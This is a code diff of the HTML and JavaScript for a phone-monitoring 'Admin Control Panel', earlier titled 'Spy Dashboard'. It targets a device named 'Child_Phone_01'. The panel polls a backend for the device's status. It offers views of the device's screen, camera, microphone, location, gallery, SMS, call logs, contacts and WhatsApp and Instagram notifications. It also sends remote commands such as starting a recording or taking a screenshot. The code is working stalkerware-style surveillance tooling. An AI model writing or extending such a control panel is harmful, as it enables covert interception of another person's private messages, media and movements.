@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Control Panel - Spy Dashboard</title>
+    <title>Admin Control Panel</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -30,11 +30,11 @@
             background: rgba(0, 0, 0, 0.5);
             border-radius: 30px; padding: 20px;
             border: 1px solid var(--glass-border);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
 
+        /* Status Header */
         .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-        .device-name { font-size: 1.1rem; font-weight: bold; text-transform: uppercase; margin-left: 8px; }
+        .device-name { font-size: 1.1rem; font-weight: bold; text-transform: uppercase; }
         
         .status-badge {
             background: #222; padding: 5px 12px; border-radius: 20px;
@@ -44,6 +44,7 @@
         .dot.online { background: var(--accent); box-shadow: 0 0 10px var(--accent); }
         .dot.offline { background: var(--offline); box-shadow: 0 0 10px var(--offline); }
 
+        /* Info Panel */
         .info-panel { display: flex; gap: 12px; margin-bottom: 20px; }
         .info-card {
             flex: 1; background: var(--glass-bg); padding: 12px;
@@ -52,11 +53,13 @@
         .label { font-size: 0.65rem; color: var(--text-muted); letter-spacing: 1px; margin-bottom: 5px; }
         .value { font-size: 0.9rem; font-weight: 500; }
 
+        /* Battery Section */
         .battery-details { background: rgba(255,255,255,0.03); border-radius: 15px; padding: 15px; margin-bottom: 20px; }
         .battery-header { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 0.85rem; }
-        .battery-bar-bg { width: 100%; height: 8px; background: #333; border-radius: 10px; overflow: hidden; }
+        .battery-bar-bg { width: 100%; height: 6px; background: #333; border-radius: 10px; overflow: hidden; }
         .battery-bar-fill { width: 0%; height: 100%; background: var(--accent); transition: 1s ease-in-out; }
 
+        /* Grid Controls */
         .controls-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
         .control-btn {
             background: var(--glass-bg); border-radius: 18px; aspect-ratio: 1/1;
@@ -64,14 +67,11 @@
             border: 1px solid var(--glass-border); cursor: pointer;
             transition: 0.2s; text-decoration: none; color: var(--text-main);
         }
-        .control-btn:hover { background: rgba(255, 255, 255, 0.15); transform: translateY(-3px); border-color: var(--accent); }
-        .control-btn i { font-size: 1.3rem; margin-bottom: 6px; }
-        .control-btn span { font-size: 0.65rem; text-align: center; color: #bbb; }
+        .control-btn:hover { background: rgba(255, 255, 255, 0.15); transform: translateY(-2px); border-color: var(--accent); }
+        .control-btn i { font-size: 1.2rem; margin-bottom: 6px; }
+        .control-btn span { font-size: 0.6rem; text-align: center; color: #bbb; }
 
-        .fa-whatsapp { color: #25D366; } 
-        .fa-instagram { color: #E1306C; } 
-        .fa-location-dot { color: #ff4444; }
-        .fa-vibration { color: #007bff; }
+        .fa-whatsapp { color: #25D366; } .fa-instagram { color: #E1306C; } .fa-location-dot { color: #ff4444; }
     </style>
 </head>
 <body>
@@ -79,7 +79,7 @@
     <div class="container">
         <div class="header">
             <div>
-                <i class="fa-solid fa-mobile-screen-button"></i>
+                <i class="fa-solid fa-mobile-side"></i>
                 <span class="device-name" id="deviceName">Detecting...</span>
             </div>
             <div class="status-badge">
@@ -95,7 +95,7 @@
             </div>
             <div class="info-card">
                 <div class="label">NETWORK</div>
-                <div id="networkType" class="value">Checking...</div>
+                <div id="networkType" class="value">Searching...</div>
             </div>
         </div>
 
@@ -107,119 +107,86 @@
             <div class="battery-bar-bg">
                 <div id="batteryFill" class="battery-bar-fill"></div>
             </div>
-            <div id="batteryStatus" style="font-size: 0.7rem; color: var(--text-muted); margin-top: 8px;">Syncing with device...</div>
+            <div id="batteryStatus" style="font-size: 0.7rem; color: var(--text-muted); margin-top: 8px;">Waiting for data...</div>
         </div>
 
         <div class="controls-grid">
-            <a href="view_screen.html" class="control-btn"><i class="fa-solid fa-display"></i><span>Screen</span></a>
+            <a href="view_screen.html" class="control-btn"><i class="fa-solid fa-mobile-screen"></i><span>Screen</span></a>
             <a href="view_camera.html" class="control-btn"><i class="fa-solid fa-camera"></i><span>Camera</span></a>
             <a href="view_audio.html" class="control-btn"><i class="fa-solid fa-microphone"></i><span>Audio</span></a>
             <a href="view_location.html" class="control-btn"><i class="fa-solid fa-location-dot"></i><span>Location</span></a>
-            
             <a href="view_gallery.html" class="control-btn"><i class="fa-solid fa-images"></i><span>Gallery</span></a>
-            <a href="view_notifications.html" class="control-btn"><i class="fa-regular fa-bell"></i><span>Notify</span></a>
-            <a href="view_call_logs.html" class="control-btn"><i class="fa-solid fa-phone"></i><span>Calls</span></a>
-            <a href="contacts.html" class="control-btn"><i class="fa-solid fa-address-book"></i><span>Contacts</span></a>
+            <a href="view_notifications.html" class="control-btn"><i class="fa-regular fa-message"></i><span>Notify</span></a>
             
-            <a href="view_sms.html" class="control-btn"><i class="fa-solid fa-comments"></i><span>SMS</span></a>
+            <div class="control-btn" id="soundBtn" onclick="cycleSoundMode()">
+                <i class="fa-solid fa-bell" id="soundIcon"></i><span id="soundText">Sound</span>
+            </div>
+
+            <div class="control-btn" onclick="sendCommand('rec_start')"><i class="fa-solid fa-circle-dot"></i><span>Rec</span></div>
             <a href="view_notifications.html" class="control-btn"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></a>
             <a href="view_notifications.html" class="control-btn"><i class="fa-brands fa-instagram"></i><span>Instagram</span></a>
+            <a href="view_call_logs.html" class="control-btn"><i class="fa-solid fa-phone"></i><span>Calls</span></a>
+            <a href="view_contacts.html" class="control-btn"><i class="fa-solid fa-address-book"></i><span>Contacts</span></a>
+            <a href="view_sms.html" class="control-btn"><i class="fa-solid fa-comments"></i><span>SMS</span></a>
             <a href="view_apps.html" class="control-btn"><i class="fa-brands fa-google-play"></i><span>Apps</span></a>
-
-            <div class="control-btn" onclick="cycleSoundMode()">
-                <i class="fa-solid fa-bell" id="soundIcon"></i><span id="soundText">Normal</span>
-            </div>
-            <div class="control-btn" onclick="sendCommand('take_screenshot')"><i class="fa-solid fa-eye"></i><span>Snap</span></div>
-            <div class="control-btn" onclick="sendCommand('vibrate')"><i class="fa-solid fa-vibration"></i><span>Vibrate</span></div>
-            <div class="control-btn" onclick="location.reload()"><i class="fa-solid fa-rotate"></i><span>Refresh</span></div>
         </div>
     </div>
 
     <script>
-        // ⚠️ Sabse Important: Aapka Render URL aur Device ID
-        const RENDER_URL = "https://child-v9no.onrender.com"; 
-        const DEVICE_ID = "Child_Phone_01";
+        // --- REAL-TIME DATA FETCHING ---
+        function updateDashboard() {
+            fetch('/api/device-status/Child_Phone_01')
+                .then(res => res.json())
+                .then(data => {
+                    // Update Device Name & Version
+                    document.getElementById('deviceName').innerText = data.model || "Unknown Device";
+                    document.getElementById('androidVer').innerText = "V" + (data.android_version || "--");
+                    
+                    // Update Connection Status
+                    const dot = document.getElementById('statusDot');
+                    const statusText = document.getElementById('statusText');
+                    if(data.isOnline) {
+                        dot.className = "dot online";
+                        statusText.innerText = "Connected";
+                        document.getElementById('networkType').innerText = data.network || "WiFi/4G";
+                    } else {
+                        dot.className = "dot offline";
+                        statusText.innerText = "Disconnected";
+                        document.getElementById('networkType').innerText = "Offline";
+                    }
 
-        async function updateDashboard() {
-            try {
-                const response = await fetch(`${RENDER_URL}/api/device-status/${DEVICE_ID}`);
-                if (!response.ok) throw new Error("Offline");
-                
-                const data = await response.json();
-
-                // UI Update
-                document.getElementById('deviceName').innerText = data.model || "Target Device";
-                document.getElementById('androidVer').innerText = data.android_version ? "V" + data.android_version : "N/A";
-                
-                const dot = document.getElementById('statusDot');
-                const statusText = document.getElementById('statusText');
-                
-                if(data.isOnline) {
-                    dot.className = "dot online";
-                    statusText.innerText = "Connected";
-                    document.getElementById('networkType').innerText = "Online";
-                } else {
-                    dot.className = "dot offline";
-                    statusText.innerText = "Disconnected";
-                    document.getElementById('networkType').innerText = "Offline";
-                }
-
-                // Battery Update
-                const battery = data.battery || 0;
-                document.getElementById('batteryPercent').innerText = battery + "%";
-                document.getElementById('batteryFill').style.width = battery + "%";
-                
-                if(battery < 20) document.getElementById('batteryFill').style.background = "#ff4444";
-                else if(battery < 50) document.getElementById('batteryFill').style.background = "#ff9800";
-                else document.getElementById('batteryFill').style.background = "#4caf50";
-
-                document.getElementById('batteryStatus').innerText = data.isOnline ? "Device is currently active" : "Last seen recently";
-
-            } catch (err) {
-                console.log("Waiting for server...");
-                document.getElementById('statusText').innerText = "Connecting...";
-                document.getElementById('statusDot').className = "dot";
-            }
+                    // Update Battery
+                    const battery = data.battery || 0;
+                    document.getElementById('batteryPercent').innerText = battery + "%";
+                    document.getElementById('batteryFill').style.width = battery + "%";
+                    document.getElementById('batteryStatus').innerText = data.isCharging ? "Charging..." : "Discharging (" + data.batteryTemp + "°C)";
+                    
+                    // Battery Color change
+                    document.getElementById('batteryFill').style.background = battery < 20 ? "#ff4444" : "#4caf50";
+                })
+                .catch(err => console.log("Waiting for server..."));
         }
 
-        // Auto Refresh Dashboard every 5 seconds
-        setInterval(updateDashboard, 5000);
-        updateDashboard();
+        // Poll server every 3 seconds for updates
+        setInterval(updateDashboard, 3000);
 
-        // Sound Mode Cycle (Normal -> Vibrate -> Silent)
-        let modeIndex = 0;
-        const modes = ['ring', 'vibrate', 'silent'];
-        const modeNames = ['Normal', 'Vibrate', 'Silent'];
-        const modeIcons = ['fa-bell', 'fa-vibration', 'fa-bell-slash'];
-
+        // Sound Mode Switcher
+        let currentMode = 0;
         function cycleSoundMode() {
-            modeIndex = (modeIndex + 1) % 3;
             const icon = document.getElementById('soundIcon');
             const text = document.getElementById('soundText');
-            
-            icon.className = `fa-solid ${modeIcons[modeIndex]}`;
-            text.innerText = modeNames[modeIndex];
-            
-            sendCommand(modes[modeIndex]);
+            currentMode = (currentMode + 1) % 3;
+            if(currentMode === 0) { icon.className = "fa-solid fa-bell"; text.innerText = "Normal"; sendCommand('ring'); }
+            else if(currentMode === 1) { icon.className = "fa-solid fa-vibration"; text.innerText = "Vibrate"; sendCommand('vibrate'); }
+            else { icon.className = "fa-solid fa-bell-slash"; text.innerText = "Silent"; sendCommand('silent'); }
         }
 
-        // Send Command to Node.js Backend
-        async function sendCommand(action) {
-            try {
-                const res = await fetch(`${RENDER_URL}/api/send-command`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ device_id: DEVICE_ID, command: action })
-                });
-                
-                if(res.ok) {
-                    console.log("Success: Command sent -> " + action);
-                } else {
-                    alert("Device offline: Command queued.");
-                }
-            } catch (err) {
-                alert("Error connecting to server.");
-            }
+        function sendCommand(action) {
+            fetch('/api/send-command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ device_id: 'Child_Phone_01', command: action })
+            });
         }
     </script>
 </body>
